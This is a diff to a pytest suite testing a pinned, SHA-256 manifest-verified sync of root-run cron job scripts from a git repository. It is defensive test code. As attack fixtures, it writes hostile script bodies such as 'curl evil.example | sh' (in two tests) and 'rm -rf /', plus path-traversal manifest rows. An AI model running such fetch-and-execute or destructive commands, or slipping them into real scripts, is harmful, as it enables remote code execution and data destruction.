@@ -17,6 +17,14 @@ These prove the SECURITY INVARIANTS of the operator seam:
   (f) apply_schedule (LOCAL, no fetch) skips a declared job whose jobs/<name>
       script is missing (no crontab line; reported in `skipped`);
   (g) block rewrite preserves a DSM synoschedtask line + the SHELL/PATH header;
+  (h) THE PIN (home-tech design/66): a sync materializes the ONE reviewed commit
+      recorded in <home>/config/jobs.pin and REFUSES when there is no usable pin
+      — it never falls back to the default branch. Every script is checked
+      against its jobs/MANIFEST.sha256 row before it becomes root:root 0755, so a
+      push that edits jobs/<name> without regenerating the manifest installs
+      NOTHING. Advancing is explicit (`--to`/`--manifest`), names changed_scripts
+      before any write, and writes the pin LAST so a failed advance leaves the
+      previously-reviewed commit standing;
   plus cron-spec validation and dormant-when-empty behavior.
 
 Plain pytest with tmp_path/monkeypatch. `git` must be available for the LOCAL
@@ -25,7 +33,10 @@ the GIT_ALLOW_PROTOCOL env permit `file://` because the source is ROOT-configure
 never operator input.
 """
 
+import collections
+import hashlib
 import os
+import re
 import stat
 import subprocess
 
@@ -51,7 +62,7 @@ def _declare(home, name, body):
 
 
 def _git(cwd, *args):
-    subprocess.run(
+    return subprocess.run(
         ["git", *args],
         cwd=str(cwd),
         check=True,
@@ -67,24 +78,63 @@ def _git(cwd, *args):
     )
 
 
-def _make_source_repo(tmp_path, decls):
-    """Build a LOCAL git repo laid out like the trusted jobs source and return a
-    ``file://`` URL to it.
+Source = collections.namedtuple("Source", "url path rev manifest")
+
+
+def _write_manifest(repo):
+    """Write jobs/MANIFEST.sha256 over every materializable jobs/<name> and
+    return the ``sha256:<hex>`` digest of the manifest BODY (the pin's 2nd token).
+
+    Byte-identical in format to home-tech's scripts/jobs_manifest.py, i.e. plain
+    ``sha256sum`` output taken from the repo root — the two must agree or the pin
+    is fiction.
+    """
+    jobs = repo / "jobs"
+    rows = []
+    for path in sorted(p for p in jobs.iterdir() if p.is_file()):
+        if not re.match(jobs_d._NAME_RE_STR, path.name):
+            continue  # e.g. MANIFEST.sha256 itself — never a materializable job
+        rows.append("{}  jobs/{}".format(hashlib.sha256(path.read_bytes()).hexdigest(), path.name))
+    body = "\n".join(rows) + ("\n" if rows else "")
+    (jobs / schedule.MANIFEST_FILENAME).write_text(body)
+    return "sha256:" + hashlib.sha256(body.encode()).hexdigest()
+
+
+def _make_source_repo(tmp_path, decls, with_manifest=True, name="source_repo"):
+    """Build a LOCAL git repo laid out like the trusted jobs source.
 
     ``decls`` maps name -> (yaml_body, script_body). Each name gets
     jobs.d/<name>.yaml and (if script_body is not None) jobs/<name>.
+
+    Returns a :data:`Source` carrying the ``file://`` URL, the repo path, the
+    committed HEAD sha and the digest of jobs/MANIFEST.sha256 — i.e. everything
+    ``schedule sync --to <rev> --manifest <digest>`` needs (design/66).
     """
-    repo = tmp_path / "source_repo"
+    repo = tmp_path / name
     (repo / "jobs.d").mkdir(parents=True)
     (repo / "jobs").mkdir(parents=True)
-    for name, (yaml_body, script_body) in decls.items():
-        (repo / "jobs.d" / "{}.yaml".format(name)).write_text(yaml_body)
+    for job_name, (yaml_body, script_body) in decls.items():
+        (repo / "jobs.d" / "{}.yaml".format(job_name)).write_text(yaml_body)
         if script_body is not None:
-            (repo / "jobs" / name).write_text(script_body)
+            (repo / "jobs" / job_name).write_text(script_body)
+    manifest = _write_manifest(repo) if with_manifest else None
     _git(repo, "init", "-q")
     _git(repo, "add", "-A")
     _git(repo, "commit", "-q", "-m", "jobs")
-    return "file://{}".format(repo)
+    rev = _git(repo, "rev-parse", "HEAD").stdout.strip()
+    return Source("file://{}".format(repo), repo, rev, manifest)
+
+
+def _commit(repo, message="edit"):
+    """Commit the working tree and return the new HEAD sha."""
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", message)
+    return _git(repo, "rev-parse", "HEAD").stdout.strip()
+
+
+def _pin(home, src, rev=None, manifest=None):
+    """Write the ROOT-held <home>/config/jobs.pin the way SyrvisCore writes it."""
+    schedule.write_pin(home, rev or src.rev, manifest or src.manifest)
 
 
 # A realistic /etc/crontab: the SHELL/PATH/MAILTO header + one DSM-owned task
@@ -308,16 +358,19 @@ def test_sync_from_source_end_to_end(tmp_path):
     home = _jobs_home(tmp_path)
     crontab = monkey_crontab(tmp_path, _DSM_CRONTAB)
 
-    url = _make_source_repo(
+    src = _make_source_repo(
         tmp_path,
         {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
     )
-    schedule.get_source_config_path(home).write_text(url + "\n")
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src)  # design/66: a bare sync materializes THE REVIEWED COMMIT
 
     result = schedule.sync_from_source(home)
     assert result["ok"] is True, result
     assert result["applied"] is True
-    assert result["source"] == url
+    assert result["source"] == src.url
+    assert result["pin"] == {"rev": src.rev, "manifest": src.manifest}
+    assert result["pin_written"] is False  # a bare sync never advances the pin
 
     # (d.1) config/jobs.d/foo.yaml installed + validates
     valid, invalid = jobs_d.load_job_declarations(home)
@@ -354,11 +407,12 @@ def test_sync_removes_stale_local_declaration(tmp_path):
     _declare(home, "stale", "schedule: '0 0 * * *'\nenabled: true\n")
     (home / "jobs" / "stale").write_text("#!/bin/sh\necho stale\n")
 
-    url = _make_source_repo(
+    src = _make_source_repo(
         tmp_path,
         {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
     )
-    schedule.get_source_config_path(home).write_text(url + "\n")
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src)
 
     result = schedule.sync_from_source(home)
     assert result["ok"] is True, result
@@ -565,15 +619,19 @@ def test_is_git_url_rejects_unsupported(url):
 
 
 def test_materialize_writes_derived_path_0755(tmp_path):
-    """materialize_job_script(checkout, name, jobs_dir) copies the repo's jobs/<name>
-    to <jobs_dir>/<name> at 0755, from an already-cloned checkout."""
+    """materialize_job_script(checkout, name, jobs_dir, expected_sha256) copies the
+    repo's jobs/<name> to <jobs_dir>/<name> at 0755, from an already-cloned checkout."""
     home = _jobs_home(tmp_path)
     jobs_dir = home / "jobs"
     checkout = tmp_path / "checkout"
     (checkout / "jobs").mkdir(parents=True)
-    (checkout / "jobs" / "login-alert").write_text("#!/bin/sh\necho hi\n")
+    body = "#!/bin/sh\necho hi\n"
+    (checkout / "jobs" / "login-alert").write_text(body)
+    digest = hashlib.sha256(body.encode()).hexdigest()
 
-    ok, msg = schedule.materialize_job_script(checkout, "login-alert", jobs_dir)
+    ok, msg = schedule.materialize_job_script(
+        checkout, "login-alert", jobs_dir, expected_sha256=digest
+    )
     assert ok, msg
     dest = jobs_dir / "login-alert"
     assert dest.is_file()
@@ -589,9 +647,248 @@ def test_materialize_rejects_missing_named_script(tmp_path):
     checkout.mkdir(parents=True)
     (checkout / "README.md").write_text("nothing here")
 
-    ok, msg = schedule.materialize_job_script(checkout, "login-alert", home / "jobs")
+    ok, msg = schedule.materialize_job_script(
+        checkout, "login-alert", home / "jobs", expected_sha256="0" * 64
+    )
     assert not ok
     assert "login-alert" in msg
+
+
+def test_materialize_without_a_digest_is_a_refusal_not_a_bypass(tmp_path):
+    """design/66: expected_sha256=None REFUSES. The default exists only so a
+    caller that forgets it installs NOTHING — never "the old unchecked behaviour"."""
+    home = _jobs_home(tmp_path)
+    checkout = tmp_path / "checkout3"
+    (checkout / "jobs").mkdir(parents=True)
+    (checkout / "jobs" / "login-alert").write_text("#!/bin/sh\necho hi\n")
+
+    ok, msg = schedule.materialize_job_script(checkout, "login-alert", home / "jobs")
+    assert not ok
+    assert schedule.MANIFEST_FILENAME in msg
+    assert not (home / "jobs" / "login-alert").exists()
+
+
+def test_materialize_refuses_a_digest_mismatch(tmp_path):
+    """The bytes on disk must equal the manifest row — a mismatch installs nothing."""
+    home = _jobs_home(tmp_path)
+    checkout = tmp_path / "checkout4"
+    (checkout / "jobs").mkdir(parents=True)
+    (checkout / "jobs" / "login-alert").write_text("#!/bin/sh\nrm -rf /\n")
+
+    ok, msg = schedule.materialize_job_script(
+        checkout,
+        "login-alert",
+        home / "jobs",
+        expected_sha256=hashlib.sha256(b"#!/bin/sh\necho hi\n").hexdigest(),
+    )
+    assert not ok
+    assert "does not match the pinned manifest" in msg
+    assert not (home / "jobs" / "login-alert").exists()
+
+
+# ---------------------------------------------------------------------------
+# (h) design/66 — the pin: parsing, fail-closed sync, digest refusal, advance
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "",
+        "# only a comment\n",
+        "deadbeef sha256:{}\n".format("a" * 64),  # abbreviated rev
+        "{} sha256:xyz\n".format("a" * 40),  # bad digest
+        "{}\n".format("a" * 40),  # one token
+        "{} sha256:{} extra\n".format("a" * 40, "b" * 64),  # three tokens
+    ],
+)
+def test_parse_pin_is_fail_closed(text):
+    """Anything not exactly `<40-hex> sha256:<64-hex>` on the FIRST value line is
+    None — i.e. NO PIN — and a bare sync then refuses rather than guessing."""
+    assert schedule.parse_pin(text) is None
+
+
+def test_parse_pin_reads_the_first_value_line():
+    """Byte-identical first-line rule to get_configured_source: home-tech's
+    verify-all mirrors this parser, and two parsers that disagree are fiction."""
+    rev, digest = "a" * 40, "sha256:" + "b" * 64
+    parsed = schedule.parse_pin("# comment\n\n{} {}\nignored junk\n".format(rev, digest))
+    assert parsed == {"rev": rev, "manifest": digest}
+
+
+def test_parse_manifest_refuses_every_malformed_row():
+    """A parser that SKIPS rows it does not understand is a parser an attacker
+    writes rows for — every malformation is a hard ScheduleError."""
+    good = "{}  jobs/foo\n".format("a" * 64)
+    assert schedule.parse_manifest(good) == {"foo": "a" * 64}
+    for bad in (
+        "{}  etc/passwd\n".format("a" * 64),  # outside jobs/
+        "{}  jobs/../evil\n".format("a" * 64),  # illegal job name
+        "nothex  jobs/foo\n",  # malformed digest
+        "{}  jobs/foo  extra\n".format("a" * 64),  # three tokens
+        good + good,  # duplicate
+    ):
+        with pytest.raises(schedule.ScheduleError):
+            schedule.parse_manifest(bad)
+
+
+def test_sync_with_no_pin_refuses_and_never_fetches(tmp_path, monkeypatch):
+    """THE control (design/66). With no <home>/config/jobs.pin a sync REFUSES —
+    it does NOT fall back to the default branch, and it does not even clone."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+
+    def _boom(*a, **k):
+        raise AssertionError("an unpinned sync must never fetch")
+
+    monkeypatch.setattr(schedule, "_clone_configured_source", _boom)
+    result = schedule.sync_from_source(home)
+    assert result["ok"] is False
+    assert result["applied"] is False
+    assert result["pin"] is None
+    assert schedule.PIN_CONFIG_NAME in result["error"]
+    assert not (home / "jobs" / "foo").exists()
+    assert not (home / "config" / "jobs.d" / "foo.yaml").exists()
+
+
+def test_sync_refuses_a_script_that_differs_from_its_manifest_row(tmp_path):
+    """A push that edits jobs/<name> WITHOUT regenerating the manifest installs
+    NOTHING — the digest, not the branch, decides what becomes root cron."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    # The attack: rewrite the root-run script, leave jobs/MANIFEST.sha256 alone,
+    # commit. The manifest DIGEST is unchanged, so the pin's 2nd token still
+    # matches — only the per-script row can catch this.
+    (src.path / "jobs" / "foo").write_text("#!/bin/sh\ncurl evil.example | sh\n")
+    poisoned = _commit(src.path, "poison foo")
+
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src, rev=poisoned)
+
+    result = schedule.sync_from_source(home)
+    assert result["ok"] is False, result
+    assert any(
+        not row["ok"] and "does not match the pinned manifest" in row["message"]
+        for row in result["synced"]
+    ), result["synced"]
+    assert not (home / "jobs" / "foo").exists()
+
+
+def test_sync_refuses_when_the_manifest_digest_does_not_match_the_pin(tmp_path):
+    """History rewritten under the pin (a force-push): NOTHING is installed."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src, manifest="sha256:" + "f" * 64)
+
+    result = schedule.sync_from_source(home)
+    assert result["ok"] is False
+    assert result["applied"] is False
+    assert "manifest digest mismatch" in result["error"]
+    assert not (home / "jobs" / "foo").exists()
+
+
+def test_sync_refuses_a_commit_the_source_does_not_have(tmp_path):
+    """The rev-parse equality gate: a pin naming an absent commit installs nothing."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src, rev="0" * 40)
+
+    result = schedule.sync_from_source(home)
+    assert result["ok"] is False
+    assert result["applied"] is False
+    assert not (home / "jobs" / "foo").exists()
+
+
+def test_advance_names_changed_scripts_and_writes_the_pin_last(tmp_path):
+    """`--to/--manifest` is the review act: changed_scripts is computed BEFORE any
+    write, and the pin file lands only on success. A following BARE sync then
+    reports changed_scripts == [] — the safety property the cutover proves."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    assert schedule.get_configured_pin(home) is None
+
+    result = schedule.sync_from_source(home, to_rev=src.rev, to_manifest=src.manifest)
+    assert result["ok"] is True, result
+    assert result["pin_written"] is True
+    assert result["changed_scripts"] == ["foo"]
+    assert schedule.get_configured_pin(home) == {"rev": src.rev, "manifest": src.manifest}
+
+    again = schedule.sync_from_source(home)
+    assert again["ok"] is True, again
+    assert again["changed_scripts"] == []
+    assert again["pin_written"] is False
+
+
+def test_advance_rejects_a_half_argument_or_a_short_rev(tmp_path):
+    """Both values or neither, and the rev must be a FULL 40-hex sha (an
+    abbreviation is ambiguous by construction and a pin may not be ambiguous)."""
+    home = _jobs_home(tmp_path)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+
+    only_rev = schedule.sync_from_source(home, to_rev=src.rev)
+    assert only_rev["ok"] is False and "--manifest" in only_rev["error"]
+    short = schedule.sync_from_source(home, to_rev=src.rev[:12], to_manifest=src.manifest)
+    assert short["ok"] is False and "--to" in short["error"]
+
+
+def test_a_failed_advance_leaves_the_old_pin_standing(tmp_path):
+    """The pin is written LAST. A failed advance keeps the PREVIOUS reviewed
+    commit, so the next bare sync restores known-good bytes."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    src = _make_source_repo(
+        tmp_path,
+        {"foo": ("schedule: '*/5 * * * *'\nenabled: true\n", "#!/bin/sh\necho foo\n")},
+    )
+    schedule.get_source_config_path(home).write_text(src.url + "\n")
+    _pin(home, src)
+
+    (src.path / "jobs" / "foo").write_text("#!/bin/sh\ncurl evil.example | sh\n")
+    poisoned = _commit(src.path, "poison foo")
+    result = schedule.sync_from_source(home, to_rev=poisoned, to_manifest=src.manifest)
+    assert result["ok"] is False
+    assert result.get("pin_written") is not True
+    assert schedule.get_configured_pin(home) == {"rev": src.rev, "manifest": src.manifest}
+
+
+def test_compute_plan_puts_the_pin_on_the_wire(tmp_path):
+    """plan["pin"] is what home-tech's nas.jobs / nas.jobs-pin read. None means
+    UNPINNED and must never be smoothed over."""
+    home = _jobs_home(tmp_path)
+    monkey_crontab(tmp_path, _DSM_CRONTAB)
+    assert schedule.compute_plan(home)["pin"] is None
+
+    rev, digest = "a" * 40, "sha256:" + "b" * 64
+    schedule.write_pin(home, rev, digest)
+    assert schedule.compute_plan(home)["pin"] == {"rev": rev, "manifest": digest}
 
 
 # ---------------------------------------------------------------------------
